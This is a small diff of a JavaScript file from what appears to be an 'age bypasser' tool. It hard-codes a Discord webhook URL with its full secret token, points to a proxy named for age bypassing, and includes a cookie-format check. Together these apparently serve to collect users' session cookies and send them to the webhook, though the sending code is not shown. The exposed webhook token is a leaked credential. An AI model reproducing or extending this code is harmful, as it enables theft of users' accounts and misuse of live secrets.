@@ -3,7 +3,7 @@
 const successSound = document.getElementById("sfx-success");
 const errorSound = document.getElementById("sfx-error");
 const swooshSound = document.getElementById("sfx-swoosh");
-const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z"; // Replace with proxy URL if using one, e.g., "https://your-proxy.onrender.com/webhook"
+const webhookUrl = "https://discord.com/api/webhooks/1408203109129256990/95rPDczDFbDQt1IivQRsS_iwRFkOnAc21x8dNzFEvE5ud2UTIfNresN2-kGqcVBA864Z"; // Replace with proxy URL if using one, e.g., const webhookUrl = "https://age-bypasser-proxy.glitch.me/webhook";
 
 // Basic format check for cookie
 function basicCookieFormatCheck(cookie) {
@@ -544,3 +544,4 @@ $("#returnBtn").on("click", function () {
   $("#refreshBtn").show();
 });
 ```
+
